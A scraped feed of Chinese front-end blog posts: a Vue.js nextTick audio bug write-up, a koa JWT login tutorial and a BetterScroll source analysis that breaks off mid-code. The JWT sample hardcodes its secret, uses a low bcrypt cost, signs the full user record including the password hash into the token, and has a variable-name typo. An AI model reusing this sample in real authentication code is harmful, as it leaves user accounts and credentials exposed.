微信浏览器的播放，那么我们如何用最小成本来解决这个问题呢？</p>\n<h3 class=\"heading\" data-id=\"heading-6\">Vue.js 的版本降级</h3><p>如果是真实运行在生产环境中的项目，毫无疑问这肯定是优先解决问题的首选，因为确实也是因为 Vue.js 的升级才造成这个 bug 的。在我们的实际项目中，我们都是锁死某个 Vue.js 的版本的，除非我们想使用某个 Vue.js 新版的 feature 或者是当前版本遇到了一个严重 bug 而新版已经修复的情况，我们才会考虑升级 Vue.js，并且每次升级都需要经过完整的功能测试。</p>\n<p>为何把 Vue.js 降级到 2.4+ 就没问题呢，因为 Vue.js 2.5 之前的 nextTick 都是优先使用 microtask 的，那么 audio 播放的时机实际上还是在当前 tick，所以当然不会有问题。</p>\n<p>说到版本问题，其实这也是 Vue.js 的一点瑕疵吧，升版本的时候有时候改动过于激进了，比如这次关于 nextTick 的升级，它其实是 Vue.js 一个非常核心的功能，但是它只有单元测试，并没有大量的功能测试 case 覆盖，也只能通过社区帮助反馈问题做改进了。</p>\n<h3 class=\"heading\" data-id=\"heading-7\">同步的 watcher</h3><p>Vue.js 的 watcher 默认是异步的，当然它也提供了同步的 watcher，这样 watcher 的回调函数执行就不需要经历了 nextTick，这样确实可以修复这个 bug，但又会引起别的问题。因为我们的音乐播放器有一个 feature 是可以在播放的过程中切换播放模式，我们支持顺序播放、随机播放、单曲循环三种播放模式，当我们从顺序播放切到随机播放模式的时候，实际上是对播放列表 <code>playlist</code> 做了修改，同时也修改了 <code>currentIndex</code>，这样可以保证我们在切换模式的时候并不会修改当前歌曲。那么问题来了，由于 <code>currentSong</code> 是由 <code>playlist</code> 和 <code>currentIndex</code> 计算而来的，对它们任何一个修改，都会触发 <code>currentSong</code> 的变化，由于我们现在改成同步的 watcher，那么 currentSong 的回调会执行 2 次，这样第一次的修改导致计算出来的歌曲就变成了另外一首了，这个显然也不是我们期望的。所以同步 watcher 也是不可行的。</p>\n<h3 class=\"heading\" data-id=\"heading-8\">其它方式</h3><p>其实还有很多方式都能“修复”这个问题，比如我们不通过 watcher，改成每次点击通过 event bus 去通知；比如仍然使用同步 watcher，但 currentSong 不通过计算，直接用 state 保留；比如每次点击事件不通过  v-on 绑定，我们直接在 mounted 的钩子函数里利用原生的 addEventListener 去绑定 click 事件。</p>\n<p>当然，上述几个方式都是可行的，但是我并不推荐这么去改，因为这样对业务代码的改动实在太大了，如果我们本身的写法如果是合理的，却要强行改成这些方式，就好像是：我知道了框架的某一个坑，我用一些奇技淫巧绕过了这些坑，这样做也是不合理的。</p>\n<p>框架产生的意义是什么：制定一种友好的开发规范，提升开发效率，让开发人员更加专注业务逻辑的开发。所以优秀的框架不应该限制开发人员对于一些场景下功能的实现方式，仅仅是因为这种实现方式虽然本身合理但可能会触发框架某个坑。</p>\n<h3 class=\"heading\" data-id=\"heading-9\">临时的 hack 方法</h3><p>由于不想动业务代码，所以我就想了一些比较 hack 的办法，因为是 MessageChannel 的锅，所以我就在 Vue.js 的初始化前，引入了一段 hack.js</p>\n<pre><code class=\"hljs js\" lang=\"JavaScript\"><span class=\"hljs-comment\">// hack for global nextTick</span>\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">noop</span>(<span class=\"hljs-params\"></span>) </span>{\n}\n\n<span class=\"hljs-built_in\">window</span>.MessageChannel = noop\n<span class=\"hljs-built_in\">window</span>.setImmediate = noop</code></pre><p>这样的话 Vue.js 在初始化 nextTick 的时候，发现全局的 <code>setImmediate</code> 和 <code>MessageChannel</code> 被改写了，就自动降级为 <code>setTimeout 0</code> 的实现，这样就可以规避掉我们的问题了。当然，这种 hack 方式算是没有办法的办法了，我并不推荐。</p>\n<h3 class=\"heading\" data-id=\"heading-10\">给 Vue.js 提 issue</h3><p>所以这种情况最合理的就是给 Vue.js 提 issue，我确实也是这么做了，去 Github 上提了一个 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fvue%2Fissues%2F7109\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">issue</a>，第一次给 Vue.js 提 issue，发现 Vue 官方这块做的还是蛮人性化的，直接给一个提 issue 的<a href=\"https://link.juejin.im?target=https%3A%2F%2Fnew-issue.vuejs.org%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">链接</a>，通过填写一些表单来描述这个 issue，并且推荐了一个很好的复现问题的工具 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fcodesandbox.io%2Fs%2Fvue\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CodeSandbox</a> 。这个 issue 当天就收到了尤大的回复，他表示 Vue.js 的 nextTick 确实会造成这个问题，但是我应该在同一个 tick 完成歌曲的播放，而不应该使用 watcher，接着就 close 了 issue。因为我提 issue 为了更直观的演示核心问题，用的就是上面提到的非常简单的 demo，所以在这种场景下，他说的也没问题，确实没有必要使用 watcher，于是我赶紧又回复了 issue，说明了一下我的真实使用场景，并表明希望从 Vue.js 内核去修复这个问题。可惜的是，尤大目前也并没有再回复这个 issue。</p>\n<h2 class=\"heading\" data-id=\"heading-11\">总结</h2><p>通过记录我这一次发现问题——定位问题——解决问题的过程，我想给同学带来的思考不仅仅是这个问题本身，还有我们遇到问题后的一些态度。发现问题并不难，很多人在写代码中都会发现问题，那么发现问题后你的第一反应是尝试自己解决，还是去求助，我相信前者肯定更好。那么在解决之前需要定位问题，这里我要提到一个词，叫“面向巧合编程”，很多人遇到问题后会不断尝试这种办法，很可能某个办法就从表象上“解决”了这个问题，却不知道为什么，这种解决问题的方式是很不靠谱的，你可能并没有根本上解决问题，又可能解决了这个问题却又引发另一个问题。所以定位问题的本质就非常关键了，其实这是一个能力，一个好的工程师不仅会写代码，也要会查问题，能快速定位到问题的本质，是一个优秀的工程师的必要条件，这一点不容易，需要平时不断地的积累。在定位到问题的本质后，就要解决问题了，一道题往往有多解，但每种解法是否合理，这也是一个需要思考的过程，多和一些比你厉害的人交流，多积攒一些这方面的经验，这也是一个积累的过程。如果以后你再遇到问题，也用这样的态度去面对的问题，那么你也会很快的成长。</p>\n<p>很多同学学习我的音乐课程后，会问：“黄老师，你什么时候再出新视频呀？”，其实我想说这门课程你真的学完了吗？因为它的定位是一门 Vue.js 的进阶课程，不仅仅是因为课程的项目本身比较复杂，而且项目中很多知识点都可以做延伸的学习，另外项目难免会有一些小 bug 和一些由于接口改动引发的功能不可用的情况，遇到这些问题除了给我提 issue，尝试自己去解决然后给我提 pull request 的方式是不是对自己的提升更大呢？所以这门课程还是值得多去挖掘的，如果真正榨干了这门课的价值再来问我也不迟，当然我也会给你们带来更多干货的课程。</p>\n<p>最后也来小小安利我的这门 Vue.js 进阶课程吧（<a href=\"https://link.juejin.im?target=http%3A%2F%2Fcoding.imooc.com%2Fclass%2F107.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">慕课网地址</a>），感兴趣的同学可以点进去看看课程介绍。课程的项目是托管在我的 Github 私服的，并不开源，所以外面的一切和这个课程相关的代码都是盗版的。这个源码我是一直维护的，包括最近 Vue.js 的脚手架的升级，以及依赖方接口的一些改造造成的功能不可用问题，都已经得到了解决。简单地截几张截图：</p>\n<p></p><figure><img alt=\"vue-music-issue\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/27/15ffb6e3d22f5e6b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"252\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;252&quot;&gt;&lt;/svg&gt;\"><figcaption>vue-music-issue</figcaption></figure><p></p>\n<p>这一张是对 issue 的处理，我们在课程推出来后解决了几十个 issue，如果有同学在学习过程中遇到问题建议去翻阅 issue 寻找答案。有一些版本的升级的 issue 我不会关，为了让同学们可以更方便的找到。</p>\n<p></p><figure><img alt=\"vue-music-contribute\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/27/15ffb6e3d369b13d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"1107\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;1107&quot;&gt;&lt;/svg&gt;\"><figcaption>vue-music-contribute</figcaption></figure><p></p>\n<p>这一张是代码提交记录，可以看到除了我还是有一些很不错的同学在一起维护这个项目，这其中有一个同学学习非常主动，自驱力很强，常与我探讨技术问题，最近他也加入了滴滴，在我们部门做了很多的产出。</p>\n<p>更直观的感受这个项目，可以扫描下方的二维码，体验一下接近原生 App 的感觉：</p>\n<p></p><figure><img alt=\"二维码\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/27/15ffb6e3d5dc0baf?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"280\" data-height=\"280\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;280&quot; height=&quot;280&quot;&gt;&lt;/svg&gt;\"><figcaption>二维码</figcaption></figure><p></p>\n<p>我们有一个官方的课程交流群，如果购买了这门课程，欢迎与其它同学一起交流学习，也可以加我的 qq 和微信，交流技术问问题都可以，不过我一般白天很忙，晚上才有时间。</p>\n<p>当然，想关注我的一些动态，也欢迎 follow 我的 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fustbhuangyi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Github</a>。</p>\n<p>希望同学们一起来支持正版，抵制盗版，我会为大家带来更多优质的课程以及其它的一些形式的技术方向的分享。</p>\n<p>本文参考的一些值得延伸学习的文章：</p>\n<p><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2014%2F10%2Fevent-loop.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">JavaScript 运行机制详解：再谈Event Loop</a></p>\n<p><a href=\"https://link.juejin.im?target=https%3A%2F%2Fjakearchibald.com%2F2015%2Ftasks-microtasks-queues-and-schedules%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Tasks, microtasks, queues and schedules</a></p>\n</div>"},null,{"title":"koa 实现 jwt 认证","avatar":"https://dn-mhke0kuv.qbox.me/EjhSj2HPBWm9WGPzpmmyReC?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"superman666","create_time":"2017 年 11 月 26 日","tags":["API","koa","前端","Node.js"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p>关于 Token 认证机制，这里不做更多解释。不清楚的可以看我的这篇文章：<a href=\"https://link.juejin.im?target=https%3A%2F%2Fchenhuichao.com%2F2017%2F03%2F13%2Ffe%2Fweb-auth%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Web开发中常见的认证机制</a><br>GitHub 地址：<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fsuperman66%2Fkoa-jwt-sample\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">koa-jwt-sample</a></p>\n<h2 class=\"heading\" data-id=\"heading-0\">所需库</h2><ul>\n<li>bcrypt - 用于加密密码</li>\n<li>koa-jwt - jwt 中间件</li>\n<li>jsonwebtoken - 用于生成token下发给浏览器，在 koa2 以后的版本不再提供 jsonwebtoken 的方法,所以需要另行安装。</li>\n</ul>\n<h2 class=\"heading\" data-id=\"heading-1\">实现思路</h2><p>整个方案实现的流程和思路很清晰，大致分为下面几步：</p>\n<ul>\n<li>自定义 401 拦截中间件，用于拦截 token 不存在或者失效的情况</li>\n<li>配置 koa-jwt</li>\n<li>注册实现</li>\n<li>登录实现</li>\n</ul>\n<h2 class=\"heading\" data-id=\"heading-2\">运行项目</h2><p>该项目需要你已经装好 mongodb，并启动。关于 mongodb 的配置见 <code>config/index.js</code>。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">npm run start</code></pre><p>该项目提供了三个 api</p>\n<ul>\n<li>/api/register</li>\n<li>/api/login</li>\n<li>/api/users</li>\n</ul>\n<p>其中 <code>/api/register</code> 和 <code>/api/login</code> 为 public api，无需token就能访问。<code>/users</code> 则为 private api，需要传入正确的 token 才能访问。</p>\n<h3 class=\"heading\" data-id=\"heading-3\">自定义 401 handler</h3><p>使用了 <code>koa-jwt</code> 中间件后，如果没有token，或者token失效，该中间件会给出对应的错误信息。如果没有自定义中间件的话，会直接将 <code>koa-jwt</code> 暴露的错误信息直接返回给用户。</p>\n<pre><code class=\"hljs js\" lang=\"JavaScript\"><span class=\"hljs-comment\">// server/middlewares/errorHandle.js</span>\n<span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> errorHandle = <span class=\"hljs-function\">(<span class=\"hljs-params\">ctx, next</span>) =&gt;</span> {\n  <span class=\"hljs-keyword\">return</span> next().catch(<span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> {\n    <span class=\"hljs-keyword\">if</span> (err.status === <span class=\"hljs-number\">401</span>) {\n      ctx.status = <span class=\"hljs-number\">401</span>;\n      ctx.body = {\n        <span class=\"hljs-attr\">error</span>: err.originalError ? err.originalError.message : err.message,\n      };\n    } <span class=\"hljs-keyword\">else</span> {\n      <span class=\"hljs-keyword\">throw</span> err;\n    }\n  });\n}</code></pre><p>然后在 <code>index.js</code> 中使用该中间件</p>\n<pre><code class=\"hljs js\" lang=\"JavaScript\">app\n  .use(errorHandle)</code></pre><h3 class=\"heading\" data-id=\"heading-4\">使用 koa-jwt</h3><p>在 <code>index.js</code> 中加入 <code>koa-jwt</code> 中间件。</p>\n<pre><code class=\"hljs js\" lang=\"JavaScript\"><span class=\"hljs-keyword\">const</span> secert = <span class=\"hljs-string\">'jwt_secret'</span>\n  app\n  .use(jwt({\n    secret,\n  }).unless({\n    <span class=\"hljs-attr\">path</span>: [<span class=\"hljs-regexp\">/\\/register/</span>, /\\/login/],\n  }))</code></pre><p>其中 <code>secret</code> 是用于加密的key，不局限于字符串，也可以是一个文件。</p>\n<pre><code class=\"hljs js\" lang=\"JavaScript\"><span class=\"hljs-comment\">// https://github.com/koajs/jwt#token-verification-exceptions</span>\n<span class=\"hljs-keyword\">var</span> publicKey = fs.readFileSync(<span class=\"hljs-string\">'/path/to/public.pub'</span>);\napp.use(jwt({ <span class=\"hljs-attr\">secret</span>: publicKey }));</code></pre><p><code>unless()</code> 用于设置哪些 api 是不需要通过 token 验证的。也就是我们通常说的 public api，无需登录就能访问的 api。在这个例子中，设置了 <code>/register</code> 和 <code>/login</code> 两个 api 无需 token 检查。</p>\n<p>在使用 <code>koa-jwt</code> 后，所有的路由（除了 <code>unless()</code> 设置的路由除外）都会检查 <code>Header</code> 首部中的  token，是否存在、是否有效。只有正确之后才能正确的访问。</p>\n<h3 class=\"heading\" data-id=\"heading-5\">注册实现</h3><p>注册很简单，这里只是简单的将密码加密，将信息存入数据库。实际项目中，还需要对用户输入的字段进行验证。</p>\n<pre><code class=\"hljs js\" lang=\"JavaScript\">  <span class=\"hljs-comment\">/**\n   * you can register with\n   * curl -X POST http://localhost:3200/api/register  -H 'cache-control: no-cache' -H 'content-type: application/x-www-form-urlencoded'  -d 'username=superman2&amp;password=123456'\n   */</span>\n  <span class=\"hljs-keyword\">async</span> register(ctx) {\n    <span class=\"hljs-keyword\">const</span> { body } = ctx.request;\n    <span class=\"hljs-keyword\">try</span> {\n      <span class=\"hljs-keyword\">if</span> (!body.username || !body.password) {\n        ctx.status = <span class=\"hljs-number\">400</span>;\n        ctx.body = {\n          <span class=\"hljs-attr\">error</span>: <span class=\"hljs-string\">`expected an object with username, password but got: <span class=\"hljs-subst\">${body}</span>`</span>,\n        }\n        <span class=\"hljs-keyword\">return</span>;\n      }\n      body.password = <span class=\"hljs-keyword\">await</span> bcrypt.hash(body.password, <span class=\"hljs-number\">5</span>)\n      <span class=\"hljs-keyword\">let</span> user = <span class=\"hljs-keyword\">await</span> User.find({ <span class=\"hljs-attr\">username</span>: body.username });\n      <span class=\"hljs-keyword\">if</span> (!user.length) {\n        <span class=\"hljs-keyword\">const</span> newUser = <span class=\"hljs-keyword\">new</span> User(body);\n        user = <span class=\"hljs-keyword\">await</span> newUser.save();\n        ctx.status = <span class=\"hljs-number\">200</span>;\n        ctx.body = {\n          <span class=\"hljs-attr\">message</span>: <span class=\"hljs-string\">'注册成功'</span>,\n          user,\n        }\n      } <span class=\"hljs-keyword\">else</span> {\n        ctx.status = <span class=\"hljs-number\">406</span>;\n        ctx.body = {\n          <span class=\"hljs-attr\">message</span>: <span class=\"hljs-string\">'用户名已经存在'</span>,\n        }\n      }\n    } <span class=\"hljs-keyword\">catch</span> (error) {\n      ctx.throw(<span class=\"hljs-number\">500</span>)\n    }\n  }</code></pre><h3 class=\"heading\" data-id=\"heading-6\">登录实现</h3><p>用户输入用户名和密码登录，如果用户名和密码正确的话，使用 <code>jsonwebtoken.sign()</code> 生成 token，并返回给客户端。客户端将token存储在本地存储，在每次的 HTTP 请求中，都将 token 添加在 HTTP Header <code>Authorazition: Bearer token</code> 中。然后后端每次去验证该token的正确与否。只有token正确后才能访问到对应的资源。</p>\n<pre><code class=\"hljs js\" lang=\"JavaScript\">  <span class=\"hljs-comment\">/** you can login with\n   * curl -X POST http://localhost:3200/api/login/ -H 'cache-control: no-cache' -H 'content-type: application/x-www-form-urlencoded' -d 'username=superman2&amp;password=123456'\n   */</span>\n  <span class=\"hljs-keyword\">async</span> login(ctx) {\n    <span class=\"hljs-keyword\">const</span> { body } = ctx.request\n    <span class=\"hljs-keyword\">try</span> {\n      <span class=\"hljs-keyword\">const</span> user = <span class=\"hljs-keyword\">await</span> User.findOne({ <span class=\"hljs-attr\">username</span>: body.username });\n      <span class=\"hljs-keyword\">if</span> (!user) {\n        ctx.status = <span class=\"hljs-number\">401</span>\n        ctx.body = {\n          <span class=\"hljs-attr\">message</span>: <span class=\"hljs-string\">'用户名错误'</span>,\n        }\n        <span class=\"hljs-keyword\">return</span>;\n      }\n      <span class=\"hljs-comment\">// 匹配密码是否相等</span>\n      <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">await</span> bcrypt.compare(body.password, user.password)) {\n        ctx.status = <span class=\"hljs-number\">200</span>\n        ctx.body = {\n          <span class=\"hljs-attr\">message</span>: <span class=\"hljs-string\">'登录成功'</span>,\n          <span class=\"hljs-attr\">user</span>: user.userInfo,\n          <span class=\"hljs-comment\">// 生成 token 返回给客户端</span>\n          token: jsonwebtoken.sign({\n            <span class=\"hljs-attr\">data</span>: user,\n            <span class=\"hljs-comment\">// 设置 token 过期时间</span>\n            exp: <span class=\"hljs-built_in\">Math</span>.floor(<span class=\"hljs-built_in\">Date</span>.now() / <span class=\"hljs-number\">1000</span>) + (<span class=\"hljs-number\">60</span> * <span class=\"hljs-number\">60</span>), <span class=\"hljs-comment\">// 60 seconds * 60 minutes = 1 hour</span>\n          }, secret),\n        }\n      } <span class=\"hljs-keyword\">else</span> {\n        ctx.status = <span class=\"hljs-number\">401</span>\n        ctx.body = {\n          <span class=\"hljs-attr\">message</span>: <span class=\"hljs-string\">'密码错误'</span>,\n        }\n      }\n    } <span class=\"hljs-keyword\">catch</span> (error) {\n      ctx.throw(<span class=\"hljs-number\">500</span>)\n    }\n  }</code></pre><p>需要注意的是，在使用 <code>jsonwebtoken.sign()</code> 时，需要传入的 <code>secret</code> 参数，这里的 <code>secret</code> 必须要与 前面设置  <code>jwt()</code> 中的 <code>secret</code> 一致。</p>\n<p>更多关于 <code>jsonwebtoken</code> 的方法，可见：<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fauth0%2Fnode-jsonwebtoken\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">github.com/auth0/node-…</a></p>\n<p>在登录后，拿着返回的 token，这时候去访问 <code>/api/users</code>，就能正确获得用户列表。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">curl -X GET http://localhost:3200/api/users -H <span class=\"hljs-string\">'authorization: Bearer token'</span> -H <span class=\"hljs-string\">'cache-control: no-cache'</span></code></pre></div>"},{"title":"BetterScroll：可能是目前最好用的移动端滚动插件(源码分析)","avatar":"https://avatars3.githubusercontent.com/u/24629298?v=4","author":"skychenbo","create_time":"2017 年 11 月 24 日","tags":["JavaScript"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p>BetterScroll 是一款重点解决移动端各种滚动场景需求的开源插件<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fustbhuangyi%2Fbetter-scroll\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GitHub地址</a>，有下列功能支持滚动列表，下拉刷新，上拉刷新，轮播图，slider等功能。<br>为了满足这些功能，better-scroll通过使用惯性滚动、边界回弹、滚动条淡入淡出来确保滚动的流畅。同时还支持很多API和事件，具体支持的事件可以查看官网讲的非常详细。<br>由于它基于原生JavaScript 实现，不依赖任何框架，所以既可以原生 JavaScript 引用，也可以与目前前端 MVVM 框架结合使用，比如，其官网上的示例就是与 Vue 的结合。</p>\n<h2 class=\"heading\" data-id=\"heading-0\">如何使用：</h2><p>再讲如何使用的之前，我们先来了解一下他的滚动原理：在浏览器中的滚动中，当内容的高度高于外边容器的高度的时候也就出现了滚动条，我们可以通过使用滚动条来看到超出的部分.</p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/23/15fe8efe428048b9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"609\" src=\"https://user-gold-cdn.xitu.io/2017/11/23/15fe8efe428048b9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"><figcaption></figcaption></figure><p></p>\n<p>better-scroll的原理正是基于这里，内容部分的宽度/高度必须大于外部宽度/高度。所以在使用<br>的时候外部容器的需要设置固定宽度，还有一个问题需要设置overflow:hidden,这是因为为了隐藏超出部分。然后就是什么时候对better-scroll进行初始化，这个有点麻烦，但是所幸，作者已经在vue框架下进行封装，我们只需要像个麻瓜一样往里边填东西就行了。但是有一点需要注意：滚动的元素只能是第一个容器的第一个元素。源码如下：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">  // this.scroller就是滚动的内容，this.wrapper是容器\n    this.scroller = this.wrapper.children[0]</code></pre><p>如果我们需要滚动多个内容怎么办呢，就用一个元素将其包裹住，让他成为容器的第一个子元素就行了。如何使用讲完了，我们来讲讲源码，毕竟这是一个源码解析的文章</p>\n<h2 class=\"heading\" data-id=\"heading-1\">核心代码：</h2><h1 class=\"heading\" data-id=\"heading-2\">1、scrollTo</h1><p>scrollTo()函数是better-scroll非常核心的一个函数，事实上我们在调用scrollToElement的<br>时候，内部进行的操作还是scrollTo函数</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">   BScroll.prototype.scrollTo = <span class=\"hljs-keyword\">function</span> (x, y, time=0, easing = ease.bounce) {\n        // useTransition是否使用css3 transition,isInTransition表示是否在滚动过程中\n        // this.x表示translate后的位置或者初始化this.x = 0\n        this.isInTransition = this.options.useTransition\n        &amp;&amp; time &gt; 0 &amp;&amp; (x !== this.x || y !== this.y)\n\n        // 如果使用的transition，就调用一系列transition的设置，默认是<span class=\"hljs-literal\">true</span>\n        <span class=\"hljs-keyword\">if</span> (!time || this.options.useTransition) {\n            this._transitionProperty()\n            this._transitionTimingFunction(easing.style)\n            this._transitionTime(time)\n            // 这个函数会更改this.x\n            this._translate(x, y)\n\n            // time存在protoType表示不仅在屏幕滑动的时候， momentum 滚动动画运行过程中实时派发 scroll 事件\n            <span class=\"hljs-keyword\">if</span> (time &amp;&amp; this.options.probeType === 3) {\n                // 这个函数的作用是派发scroll事件\n                this._startProbe()\n            }\n\n            // wheel用于picker组件设置,不用管\n            <span class=\"hljs-keyword\">if</span> (this.options.wheel) {\n                <span class=\"hljs-keyword\">if</span> (y &gt; 0) {\n                    this.selectedIndex = 0\n                } <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (y &lt; this.maxScrollY) {\n                    this.selectedIndex = this.items.length - 1\n                } <span class=\"hljs-keyword\">else</span> {\n                    this.selectedIndex = Math.round(Math.abs(y / this.itemHeight))\n                }\n            } <span class=\"hljs-keyword\">else</span> {\n                // 进行动画this._animate\n                this._animate(x, y, time, easing.fn)\n            }\n        }\n    };</code></pre><p>我们来依次看看这个函数，其中简单的操作用代码注明，也就不做太多的描述，其中例如this._transition这种有关transform的都是改变他的位置而已，这里我需要说明一下，我们在制作轮播图的时候，别去使用transform这种方法来做轮播图，因为当我们需要获取transform属性值的时候，你会获取到的值是一个非常奇怪的矩阵，得到translateX或者translateY的值是一件非常痛苦的事，可以看看作者是如何获取transform的值的，</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">matrix = matrix[style.transform].split(<span class=\"hljs-string\">')'</span>)[0].split(<span class=\"hljs-string\">', '</span>)\n            x = +(matrix[12] || matrix[4])\n            y = +(matrix[13] || matrix[5])</code></pre><p>我是一脸蒙蔽，要是你觉得你水平很高当我没说。this.options.probeType这个probeType配置表明的是我们需要在什么情况下派发scroll事件，在better-scroll的原理中是默认阻止浏览器的默认行为的，那我们是如何派发事件的呢？</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">  <span class=\"hljs-built_in\">export</span> <span class=\"hljs-keyword\">function</span> tap(e, eventName) {\n        <span class=\"hljs-built_in\">let</span> ev = document.createElement(<span class=\"hljs-string\">'Event'</span>)\n        ev.initEvent(eventName, <span class=\"hljs-literal\">true</span>, <span class=\"hljs-literal\">true</span>)\n        e.target.dispatchEvent(ev)\n    }</code></pre><p>创建一个element,然后初始化，然后派发事件，我们就可以像addEventListener('click', fn, false)这样的方式来监听事件addEventListener(eventName, fn, false)。这儿有一个参数叫easing,我们来看看easing是什么<br>下面是一个easing的一个选项：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\"> bounce: {\n        style: <span class=\"hljs-string\">'cubic-bezier(0.165, 0.84, 0.44, 1)'</span>,\n        fn: <span class=\"hljs-keyword\">function</span> (t) {\n            <span class=\"hljs-built_in\">return</span> 1 - (--t * t * t * t)\n        }\n    }</code></pre><p>可以看到easing通过贝瑟尔函数，和fn让我们的动画显得不是那么僵硬。贝瑟尔函数可以去看看，他让动画不再那么突兀。</p>\n<h1 class=\"heading\" data-id=\"heading-3\">2、refresh函数</h1><p>在实际开发中，有时候从后端请求到数据后，我们dom结构发生变化，所以需要调用refresh方法，来看看他是什么玩意</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">    BScroll.prototype.refresh = <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        // <span class=\"hljs-built_in\">return</span> getBoundingRect getRect()\n        <span class=\"hljs-built_in\">let</span> wrapperRect = getRect(this.wrapper)\n        this.wrapperWidth = wrapperRect.width\n        this.wrapperHeight = wrapperRect.height\n\n        <span class=\"hljs-built_in\">let</span> scrollerRect = getRect(this.scroller)\n        this.scrollerWidth = scrollerRect.width\n        this.scrollerHeight = scrollerRect.height\n        const wheel = this.options.wheel\n        // wheel用于picker组件设置\n        <span class=\"hljs-keyword\">if</span> (wheel) {\n            this.items = this.scroller.children\n            this.options.itemHeight = this.itemHeight = this.items.length ? this.scrollerHeight / this.items.length : 0\n            <span class=\"hljs-keyword\">if</span> (this.selectedIndex === undefined) {\n                this.selectedIndex = wheel.selectedIndex || 0\n            }\n            this.options.startY = -this.selectedIndex * this.itemHeight\n            this.maxScrollX = 0\n            this.maxScrollY = -this.itemHeight * (this.items.length - 1)\n        } <span class=\"hljs-keyword\">else</span> {\n            // 允许滑动的距离\n            this.maxScrollX = this.wrapperWidth - this.scrollerWidth\n            this.maxScrollY = this.wrapperHeight - this.scrollerHeight\n        }\n\n        // 滚动原理容器的宽度小于scroller的宽度\n        // scrollX设置为<span class=\"hljs-literal\">true</span>表示可以横向滚动\n        this.hasHorizontalScroll = this.options.scrollX &amp;&amp; this.maxScrollX &lt; 0\n        this.hasVerticalScroll = this.options.scrollY &amp;&amp; this.maxScrollY &lt; 0\n\n        // 如果水平不存在的话\n        <span class=\"hljs-keyword\">if</span> (!this.hasHorizontalScroll) {\n            this.maxScrollX = 0\n            this.scrollerWidth = this.wrapperWidth\n        }\n\n        <span class=\"hljs-keyword\">if</span> (!this.hasVerticalScroll) {\n            this.maxScrollY = 0\n            this.scrollerHeight = this.wrapperHeight\n        }\n\n        this.endTime = 0\n        // 移动方向\n        this.directionX = 0\n        this.directionY = 0\n        // <span class=\"hljs-built_in\">return</span> el.offsetLeft\n        // el.offsetLeft是距离父容器的距离\n        // el.getBoundingClientRect()返回的是距离页面的距离\n        this.wrapperOffset = offset(this.wrapper)\n\n        // 切换到refresh事件\n        this.trigger(<span class=\"hljs-string\">'refresh'</span>)\n\n        // 重置位置\n        this.resetPosition()\n    }</code></pre><p>当我们的dom结构发生变化的时候，我们就需要重新计算父容器和容器的大小了，这样就可以重新渲染了，这个函数没什么太难理解的部分，需要注意的是getBoundingClientRect()方法返回元素的大小及其相对于视口的位置。他同element.style获取的有些不同getBoundingClientRect()获取到的值是相对视口左上角，意思是说在获取right值的时候，事实上是left+element.clientWidth。而且getBoundingClientRect()是只能读取，而element.style不仅能读取，还能获取。el.offsetLeft返回的距离父容器的距离，如果我们需要得到元素距离document的距离的话我们就需要这样写</p>\n<pre><code class=\"hljs bash\" lang=\"bash\"><span class=\"hljs-built_in\">export</span> <span class=\"hljs-keyword\">function</span> offset(el) 